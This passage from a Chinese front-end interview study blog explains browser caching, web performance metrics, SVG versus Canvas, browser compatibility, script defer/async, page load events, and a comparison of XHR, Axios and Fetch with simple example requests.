会将很多服务整合到一个进程中，从而节省内存占用。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/61b32945c403485d8da21ba23bc6cec8~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><h3 id="7、浏览器缓存"><a href="#7、浏览器缓存" class="headerlink" title="7、浏览器缓存"></a>7、浏览器缓存</h3><p>浏览器缓存是一种用于提高网页加载性能和减少网络流量的技术。它通过将网页的资源（如HTML、CSS、JavaScript、图像等）存储在本地，以便在用户再次访问相同页面时可以更快地加载这些资源。浏览器缓存可以减少服务器的负载，加速页面加载速度，提高用户体验。</p><p>浏览器缓存主要有两种类型：<strong>HTTP缓存</strong>和<strong>localStorage&#x2F;sessionStorage</strong>。</p><ol><li><p><strong>HTTP缓存</strong>：</p><p>HTTP缓存是通过HTTP协议来管理的，它使用HTTP响应头来控制浏览器是否缓存资源以及缓存的策略。以下是HTTP缓存的主要特点和策略：</p><ul><li><p><strong>Cache-Control和Expires</strong>：HTTP响应头中的<code>Cache-Control</code>和<code>Expires</code>字段指示浏览器缓存资源的有效期。<code>Cache-Control</code>可以设置为<code>max-age</code>来指定缓存的秒数，而<code>Expires</code>设置一个具体的过期日期时间。浏览器会根据这些字段来决定是否使用缓存。</p></li><li><p><strong>Last-Modified和If-Modified-Since</strong>：服务器可以在响应头中发送<code>Last-Modified</code>字段，表示资源的最后修改日期。当浏览器再次请求资源时，可以使用<code>If-Modified-Since</code>字段来检查资源是否有更新。如果没有更新，服务器返回304状态码，浏览器将使用缓存副本。</p></li><li><p><strong>ETag和If-None-Match</strong>：类似于Last-Modified，服务器可以发送<code>ETag</code>字段，它是一个唯一的资源标识符。当浏览器再次请求资源时，可以使用<code>If-None-Match</code>字段来检查资源是否有更新。如果没有更新，服务器返回304状态码，浏览器将使用缓存副本。</p></li><li><p><strong>强制刷新和硬刷新</strong>：用户可以通过强制刷新或硬刷新来忽略缓存并重新加载页面或资源。</p></li></ul></li><li><p><strong>localStorage和sessionStorage</strong>：</p><p><code>localStorage</code>和<code>sessionStorage</code>是Web Storage API的一部分，它们允许网页在浏览器中存储键值对数据。这些数据是基于域名的，可以在同一浏览器中的不同页面之间共享。</p><ul><li><p><strong>localStorage</strong>：数据存储在本地，不会过期，除非用户手动清除或网页使用JavaScript代码删除它们。</p></li><li><p><strong>sessionStorage</strong>：数据存储在会话级别，当会话结束时（通常是关闭浏览器标签或窗口时）将自动删除。</p></li></ul><p>这些存储方式通常用于存储用户的本地数据、设置选项等，并不适用于缓存网页资源。</p></li></ol><p>使用浏览器缓存时，需要注意以下几点：</p><ul><li><p><strong>缓存策略</strong>：在HTTP响应头中明确设置适当的缓存策略，以确保资源能够根据需求进行缓存或重新加载。</p></li><li><p><strong>缓存清除</strong>：浏览器缓存可以被用户手动清除，因此不应该依赖于缓存来存储敏感信息。</p></li><li><p><strong>版本控制</strong>：当资源发生更改时，确保使用版本号或其他方法来强制浏览器获取新的资源而不是使用旧的缓存。</p></li><li><p><strong>浏览器开发工具</strong>：浏览器开发工具通常提供了查看和管理缓存的功能，可以用来调试和验证缓存设置。</p></li><li><p><strong>缓存控制头</strong>：了解和正确配置HTTP响应头中的缓存控制字段，例如<code>Cache-Control</code>、<code>Expires</code>、<code>ETag</code>等。</p></li></ul><p>浏览器缓存是一项强大的性能优化技术，但需要正确配置和管理，以确保它的行为符合你的需求。</p><h3 id="8、讲讲常见的性能指标有哪些？它们分别对应的作用是什么？"><a href="#8、讲讲常见的性能指标有哪些？它们分别对应的作用是什么？" class="headerlink" title="8、讲讲常见的性能指标有哪些？它们分别对应的作用是什么？"></a>8、讲讲常见的性能指标有哪些？它们分别对应的作用是什么？</h3><p>Web前端性能指标是衡量一个网站或Web应用程序加载速度、交互性和用户体验的关键因素。以下是一些常见的Web前端性能指标及其解释：</p><ol><li>首次绘制（FP，First Paint）：页面在用户设备上开始渲染的时间点。这个指标可以用来衡量页面加载速度的初步感知。</li><li>首次内容绘制（FCP，First Contentful Paint）：页面上的任何内容（如文字、图片等）首次渲染的时间点。这个指标可以用来衡量用户看到页面内容的速度。</li><li>首次有效绘制（FMP，First Meaningful Paint）：页面主要内容呈现给用户的时间点。这个指标可以用来衡量页面的视觉完整度。</li><li>首次输入延迟（FID，First Input Delay）：用户首次与页面交互（如点击按钮、输入等）所需时间。这个指标可以用来衡量页面的交互性。</li><li>速度指数（SI，Speed Index）：描述页面加载过程中的视觉体验的一个指标。速度指数越低，用户体验越好。</li><li>大致加载时间（TTFB，Time To First Byte）：从用户发出请求到接收到服务器响应的第一个字节所需的时间。这个指标可以用来衡量网络延迟和服务器处理速度。</li><li>页面完全加载时间（Load Time）：从用户发出请求到页面完全加载所需的时间。这个指标可以用来衡量页面加载速度的综合体验。</li><li>页面体积：页面的所有资源（HTML、CSS、JavaScript等）的总大小。页面体积越小，加载速度越快。</li><li>请求次数：加载页面所需的网络请求次数。请求次数越少，加载速度越快。</li><li>首次CPU空闲时间（First CPU Idle）：页面首次达到CPU空闲状态的时间点。这个指标可以用来衡量页面在何时可以响应用户输入。</li><li>最大潜在首次输入延迟（Max Potential FID）：一个预测性指标，衡量在页面首次可交互之前可能发生的最大输入延迟。</li><li>累计布局偏移（CLS，Cumulative Layout Shift）：页面在加载过程中元素位置变化的总和。这个指标可以用来衡量页面的视觉稳定性。</li></ol><h3 id="9、svg和canvs的区别"><a href="#9、svg和canvs的区别" class="headerlink" title="9、svg和canvs的区别"></a>9、svg和canvs的区别</h3><p>SVG（可缩放矢量图形）和Canvas是两种用于在Web上绘制图形的不同技术，它们具有不同的工作原理和用途，以下是它们的主要区别：</p><ol><li><p><strong>图形绘制方式：</strong></p><ul><li><strong>SVG：</strong> SVG是一种基于XML的矢量图形格式，它使用XML标签来描述图形元素，如圆形、矩形、线条等。SVG图形是分层的，每个图形元素都是独立的DOM节点，可以通过CSS和JavaScript进行修改和控制。</li><li><strong>Canvas：</strong> Canvas是一个HTML元素，它提供了一个2D绘图环境，可以使用JavaScript绘制位图图形。在Canvas上绘制图形是通过绘制像素来实现的，没有明确的图形元素可供操作，所有图形都是像素级的。</li></ul></li><li><p><strong>分辨率：</strong></p><ul><li><strong>SVG：</strong> SVG图形是矢量图形，它们可以无限缩放而不失真，因为它们是基于数学公式描述的。SVG图形适合在不同分辨率的设备上显示。</li><li><strong>Canvas：</strong> Canvas绘制的图形是像素级的位图，它们的分辨率是固定的。在高分辨率设备上显示Canvas图形可能会导致图像失真或模糊。</li></ul></li><li><p><strong>互动性：</strong></p><ul><li><strong>SVG：</strong> 由于SVG图形是基于DOM元素的，可以轻松地添加事件监听器，使图形具有互动性，例如点击、悬停和拖拽。</li><li><strong>Canvas：</strong> Canvas上的图形通常需要更多的JavaScript编程来实现互动性，因为它们是位图，没有内置的事件处理。</li></ul></li><li><p><strong>复杂性：</strong></p><ul><li><strong>SVG：</strong> 对于复杂的图形，特别是需要频繁更新的图形，SVG通常更容易管理和维护，因为它提供了高级的文档结构和操作方法。</li><li><strong>Canvas：</strong> 对于大规模的位图绘制或需要动画的场景，Canvas可能更高效，但也更复杂，因为您需要自行处理所有绘制和更新逻辑。</li></ul></li><li><p><strong>适用场景：</strong></p><ul><li><strong>SVG：</strong> 适合用于绘制复杂的、交互式的矢量图形，例如图表、地图、可缩放的图标等。</li><li><strong>Canvas：</strong> 适合用于绘制大规模位图、游戏、动画和需要频繁绘制的图形。</li></ul></li></ol><p>综上所述，SVG和Canvas各有其优势和适用场景。选择使用哪种技术取决于您的具体需求和项目性质。在某些情况下，它们也可以结合使用，以充分发挥各自的优势。例如，您可以使用Canvas来绘制复杂的位图背景，并在上面使用SVG来添加交互式元素。</p><h3 id="10、处理浏览器兼容性问题"><a href="#10、处理浏览器兼容性问题" class="headerlink" title="10、处理浏览器兼容性问题"></a>10、处理浏览器兼容性问题</h3><p>在前端开发中，处理浏览器兼容性问题是一项重要的任务。浏览器兼容性问题可以涵盖多个方面，包括样式和DOM操作。以下是处理浏览器兼容性问题时常见的样式和DOM操作方面的注意事项和解决方法：</p><p><strong>样式兼容性：</strong></p><ol><li><p><strong>CSS前缀：</strong> 不同浏览器可能需要不同的CSS前缀，例如 <code>-webkit-</code>、<code>-moz-</code>、<code>-ms-</code> 等。使用CSS预处理器如Sass或自动前缀工具可以自动添加所需的前缀。</p></li><li><p><strong>Flexbox和Grid布局：</strong> Flexbox和Grid布局是强大的布局工具，但不同浏览器对其支持不同。在使用这些新布局时，确保检查并提供备用布局选项或使用Polyfill。</p></li><li><p><strong>CSS Grid布局：</strong> 对于一些老版本的浏览器，可能需要使用旧版本的Grid布局规范（如MS Grid）。</p></li><li><p><strong>CSS属性和值：</strong> 某些CSS属性和值在不同浏览器中有不同的支持。使用caniuse.com等工具来检查属性和值的兼容性，或使用Polyfill来填充不兼容的功能。</p></li></ol><p><strong>DOM操作兼容性：</strong></p><ol><li><p><strong>事件处理：</strong> 不同浏览器可能对事件处理有不同的方式。使用现代的事件绑定方法（<code>addEventListener</code>）以确保跨浏览器兼容性。</p></li><li><p><strong>DOM操作：</strong> 不同浏览器可能对DOM操作有不同的实现和性能。在进行DOM操作时，尽量避免频繁的重绘和回流，以提高性能。</p></li><li><p><strong>跨浏览器API：</strong> 使用库或框架（如jQuery）可以帮助处理不同浏览器之间的DOM操作差异，但要注意不要滥用这些工具，以免引入额外的性能开销。</p></li><li><p><strong>Polyfill和垫片（Shim）：</strong> 对于不支持新特性的旧浏览器，可以考虑使用Polyfill或Shim来提供相同的功能。例如，Babel可以将ES6代码转换为ES5，以在老版本浏览器上运行。</p></li><li><p><strong>浏览器特定的检测和分支：</strong> 在代码中使用浏览器特定的检测和分支，以根据不同浏览器执行不同的操作。这可以通过<code>navigator.userAgent</code>或Modernizr等工具来实现。</p></li></ol><p>总之，处理样式和DOM操作的浏览器兼容性问题需要仔细的测试和策略。通常情况下，使用现代的Web标准和工具，并根据需要提供备用解决方案，可以帮助确保网站在各种浏览器和设备上良好运行。同时，不断跟踪Web标准和浏览器的变化，以保持对最新兼容性问题的了解。</p><h4 id="webkit-、-moz-和-ms"><a href="#webkit-、-moz-和-ms" class="headerlink" title="-webkit-、-moz- 和 -ms-"></a><code>-webkit-</code>、<code>-moz-</code> 和 <code>-ms-</code></h4><p><code>-webkit-</code>、<code>-moz-</code> 和 <code>-ms-</code> 是CSS中的前缀（prefix）或厂商前缀（vendor prefix），用于指示不同浏览器对某些CSS属性或功能的实验性支持或私有实现。这些前缀通常用于确保在不同浏览器中获得一致的外观和行为，尤其是在新的CSS功能尚未成为标准之前。</p><p>以下是这些常见的浏览器前缀的解释：</p><ol><li><strong><code>-webkit-</code>：</strong> 这是用于WebKit引擎的前缀，WebKit引擎被用于Safari浏览器、Google Chrome浏览器以及一些其他浏览器。您可以在这些浏览器中使用<code>-webkit-</code>前缀来应用某些CSS属性，以确保在这些浏览器中正确渲染。</li><li><strong><code>-moz-</code>：</strong> 这是用于Mozilla Firefox浏览器的前缀，您可以在Firefox中使用<code>-moz-</code>前缀来应用某些CSS属性，以确保在Firefox中正确渲染。</li><li><strong><code>-ms-</code>：</strong> 这是用于Microsoft Internet Explorer浏览器的前缀，您可以在早期版本的IE中使用<code>-ms-</code>前缀来应用某些CSS属性，以确保在这些浏览器中正确渲染。不过，随着IE的逐渐淘汰，对<code>-ms-</code>前缀的需求也减少了。</li></ol><h3 id="11、defer和async的区别"><a href="#11、defer和async的区别" class="headerlink" title="11、defer和async的区别"></a>11、defer和async的区别</h3><p><code>&lt;script&gt;</code> 标签的 <code>defer</code> 和 <code>async</code> 属性是用于控制脚本的加载和执行方式的两种不同方式：</p><ol><li><strong><code>async</code> 属性：</strong><ul><li><code>async</code> 属性用于异步加载脚本。当浏览器遇到带有 <code>async</code> 属性的 <code>&lt;script&gt;</code> 标签时，它会继续解析HTML，同时开始下载脚本文件。</li><li>一旦脚本文件下载完成，浏览器会立即执行脚本，而不会等待页面的解析完成。这意味着脚本的执行可能会在页面的其余内容加载和解析之前开始。</li><li><code>async</code> 适用于那些不依赖于页面解析顺序并且可以在任何时候执行的脚本，例如用于统计分析或广告的脚本。</li></ul></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;example.js&quot;</span> <span class="hljs-attr">async</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><strong><code>defer</code> 属性：</strong><ul><li><code>defer</code> 属性也用于异步加载脚本，但有一些重要区别。当浏览器遇到带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 标签时，它会继续解析HTML，同时下载脚本文件。</li><li>但与 <code>async</code> 不同，脚本的执行会被推迟到页面解析完成之后（<code>DOMContentLoaded</code> 事件之前）进行。这意味着脚本不会阻止页面的渲染和加载。</li><li><code>defer</code> 适用于那些需要在页面加载完成后执行的脚本，通常用于初始化应用程序或操作文档内容。</li></ul></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;example.js&quot;</span> <span class="hljs-attr">defer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>总结一下：</p><ul><li>如果脚本不依赖于页面解析顺序，并且可以立即执行，可以使用 <code>async</code>。</li><li>如果脚本需要等待页面解析完成后执行，可以使用 <code>defer</code>，它通常更适合将脚本放在页面底部，以优化性能。</li><li>如果不使用 <code>async</code> 或 <code>defer</code>，脚本会按照它们在HTML中的顺序进行下载和执行，可能会阻止页面加载或渲染。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20231005150702646-20231005%2015:07:04.png" alt="image-20231005150702646"></p><h5 id="onload和domcontentloaded的区别"><a href="#onload和domcontentloaded的区别" class="headerlink" title="onload和domcontentloaded的区别"></a>onload和domcontentloaded的区别</h5><p><code>onload</code> 和 <code>DOMContentLoaded</code> 是两个不同的事件，用于在页面加载过程中进行处理，它们之间有以下区别：</p><ol><li><p><strong>触发时机：</strong></p><ul><li><code>DOMContentLoaded</code> 事件：当整个HTML文档被完全解析和加载，而不需要等待外部资源（如样式表、图片和媒体文件）下载完成时触发。</li><li><code>onload</code> 事件：当整个页面及其所有依赖的外部资源都已经加载完成时触发，包括样式表、图片、媒体文件等。</li></ul></li><li><p><strong>执行顺序：</strong></p><ul><li><code>DOMContentLoaded</code> 事件通常在页面解析完成后立即触发，这意味着它可能会在外部资源加载完成之前发生。</li><li><code>onload</code> 事件则会等待整个页面及其依赖的资源加载完成后才触发。这意味着它通常会在 <code>DOMContentLoaded</code> 之后发生。</li></ul></li><li><p><strong>用途：</strong></p><ul><li><code>DOMContentLoaded</code> 通常用于执行与DOM操作相关的初始化工作。因为它在DOM解析完成后触发，所以可以安全地访问和操作DOM元素。</li><li><code>onload</code> 通常用于执行与页面依赖资源相关的初始化工作，例如图片加载完成后的操作。它也可以用于执行其他一些需要在页面完全加载后才执行的任务。</li></ul></li></ol><p>举例来说，如果您希望在DOM解析完成后立即执行某些操作（例如修改DOM元素），则可以使用 <code>DOMContentLoaded</code> 事件。如果您希望等待所有页面资源加载完成后再执行某些操作（例如测量页面元素的尺寸），则可以使用 <code>onload</code> 事件。</p><p>需要注意的是，不同浏览器对这两个事件的触发时机可能存在一些微小的差异，因此在编写代码时最好考虑到这些差异。</p><h2 id="js基础篇"><a href="#js基础篇" class="headerlink" title="js基础篇"></a>js基础篇</h2><h3 id="x3D-x3D-1、ajax、axios、fetch对比-x3D-x3D"><a href="#x3D-x3D-1、ajax、axios、fetch对比-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;1、ajax、axios、fetch对比&#x3D;&#x3D;"></a>&#x3D;&#x3D;1、ajax、axios、fetch对比&#x3D;&#x3D;</h3><p><a href="https://juejin.cn/post/7211103821082394682">https://juejin.cn/post/7211103821082394682</a></p><h5 id="XMLHttpRequest（XHR）原理"><a href="#XMLHttpRequest（XHR）原理" class="headerlink" title="XMLHttpRequest（XHR）原理"></a>XMLHttpRequest（XHR）原理</h5><p>XMLHttpRequest（XHR）是一个用于发起 HTTP 请求的浏览器内置对象，它允许 JavaScript 代码与服务器进行通信，从服务器获取数据或将数据发送到服务器。XHR 的原理可以简要概括如下：</p><ol><li><p><strong>创建 XMLHttpRequest 对象：</strong> 在 JavaScript 中，可以通过创建 XMLHttpRequest 对象来使用 XHR。通常，你可以使用 <code>new XMLHttpRequest()</code> 来创建一个新的 XHR 实例。</p></li><li><p><strong>配置请求：</strong> 一旦创建了 XHR 对象，你需要配置它以执行特定的 HTTP 请求。你可以设置请求的方法（GET、POST、PUT、DELETE 等）、URL、是否异步等参数。例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>, <span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure></li><li><p><strong>设置回调函数：</strong> XHR 允许你为请求的不同阶段设置回调函数。常见的回调函数包括请求成功时的回调、请求失败时的回调等。你可以使用 <code>onload</code>、<code>onerror</code> 等事件监听器来设置这些回调函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">xhr.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>    <span class="hljs-comment">// 请求成功，处理响应数据</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(xhr.<span class="hljs-property">responseText</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 请求失败</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Request failed with status:&#x27;</span>, xhr.<span class="hljs-property">status</span>);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p><strong>发送请求：</strong> 配置完成后，使用 <code>send()</code> 方法来发送请求。如果是异步请求，你可以在发送请求后继续执行其他代码，而不需要等待请求完成。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">xhr.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure></li><li><p><strong>处理响应：</strong> 当服务器响应到达时，会触发事先设置的回调函数。你可以从 <code>xhr.responseText</code> 中获取响应的文本数据，或者使用其他属性来获取响应的状态码、头部信息等。</p></li></ol><p>XHR 的工作原理是通过浏览器提供的底层 HTTP 协议栈与服务器进行通信，发送请求并接收响应。XHR 支持同步和异步请求，但在现代 Web 开发中，通常使用异步请求，以避免阻塞页面渲染。</p><p>需要注意的是，虽然 XHR 是传统的网络请求方式，但现代 Web 开发中更常见的是使用 Fetch API 或其他基于 Promise 的网络请求库（如 Axios）。这些方法更简单、可读性更好，并且提供了更强大的功能。</p><h5 id="Ajax、Axios-和-Fetch-API-对比"><a href="#Ajax、Axios-和-Fetch-API-对比" class="headerlink" title="Ajax、Axios 和 Fetch API 对比"></a>Ajax、Axios 和 Fetch API 对比</h5><p>在前端开发中，Ajax、Axios 和 Fetch API 都是用于进行网络请求的工具。以下是它们之间的对比，并提供了一些示例：</p><ol><li><strong>Ajax：</strong> Ajax（Asynchronous JavaScript and XML）是一种使用原生JavaScript进行异步通信的技术。它通常使用 <code>XMLHttpRequest</code> 对象来发起网络请求。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>, <span class="hljs-literal">true</span>);<br><br>xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>    <span class="hljs-keyword">var</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>  &#125;<br>&#125;;<br><br>xhr.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>Axios：</strong> Axios 是一个基于Promise的HTTP客户端，用于在浏览器和Node.js中发送HTTP请求。它提供了更容易使用和处理的API，并支持拦截器、并发请求等功能。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 使用Axios发送GET请求</span><br>axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">response</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response.<span class="hljs-property">data</span>);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">error</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);<br>  &#125;);<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>Fetch API：</strong> Fetch API 是JavaScript的新标准，提供了一种现代的方式来进行网络请求。它返回一个Promise，使用<code>fetch</code>函数发送请求。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 使用Fetch API发送GET请求</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">response</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network response was not ok&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();<br>  &#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">error</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);<br>  &#125;);<br></code></pre></td></tr></table></figure><p><code>fetch</code> 是基于 Promise 的 API，用于进行网络请求和获取资源。它是现代 JavaScript 中用于发起 HTTP 请求的一种方式，取代了传统的 <code>XMLHttpRequest</code>。</p><p><code>fetch</code> 基于 Promise 的特性，使得处理异步网络请求更加简单和可控。它返回一个 Promise 对象，可以通过 <code>.then()</code> 和 <code>.catch()</code> 方法来处理请求的结果和错误。这意味着你可以使用 Promise 的链式调用来处理多个异步操作，使代码更加清晰和可读。</p><p>以下是一个使用 <code>fetch</code> 的简单示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network response was not ok&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>(); <span class="hljs-comment">// 解析 JSON 数据</span><br>  &#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data); <span class="hljs-comment">// 处理获取到的数据</span><br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;There was a problem with the fetch operation:&#x27;</span>, error);<br>  &#125;);<br></code></pre></td></tr></table></figure><p>在这个示例中，<code>fetch</code> 返回一个 Promise，我们可以使用 <code>.then()</code> 方法处理成功的情况，使用 <code>.catch()</code> 方法处理失败的情况。这种链式调用的方式使得异步操作更加可管理。</p><p>需要注意的是，<code>fetch</code> 默认不会将网络请求视为网络错误，即使响应状态码为 404 或 500，它也会认为请求成功。因此，在 <code>.then()</code> 中通常会检查响应的 <code>ok</code> 属性来判断请求是否成功。如果需要处理其他状态码，可以自行添加条件。</p><p>总之，<code>fetch</code> 是基于 Promise 的网络请求 API，提供了现代的、可控的方式来进行网络通信，适用于前端和后端通信以及获取各种类型的资源。</p><p>对比：</p><ul><li><p><strong>Promises vs Callbacks：</strong> Axios 和 Fetch API 使用Promises来处理异步操作，使得代码更加清晰和可维护，而Ajax通常使用回调函数，可能导致回调地狱（Callback Hell）。</p></li><li><p><strong>API和功能丰富程度：</strong> Axios提供了更多的高级功能，如请求和响应拦截器、并发请求等，而Fetch API更为基础，需要额外的工作来处理非常复杂的用例。</p></li><li><p><strong>浏览器兼容性：</strong> Fetch API是HTML5标准的一部分，不支持IE浏览器（需要使用polyfill），而Ajax和Axios支持各种现代和旧版浏览器。</p></li></ul><p>根据您的项目需求和目标浏览器支持，选择适合您的网络请求工具。Axios通常是一个很好的选择，因为它提供了一组功能齐全的工具，同时兼容现代浏览器。Fetch API也是一个不错的选择，特别是对于现代Web应用程序。</p><h5 id="补充：复杂场景的实例"><a href="#补充：复杂场景的实例" class="headerlink" title="补充：复杂场景的实例"></a>补充：复杂场景的实例</h5><p>以下是一些稍微复杂的场景示例，分别演示了如何使用 Ajax、Axios 和 Fetch API 来处理不同类型的网络请求：</p><p><strong>场景 1：发送 POST 请求并处理 JSON 响应</strong></p><p>使用 Ajax：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;https://api.example.com/post-data&#x27;</span>, <span class="hljs-literal">true</span>);<br>xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;application/json&#x27;</span>);<br>xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>    <span class="hljs-variable 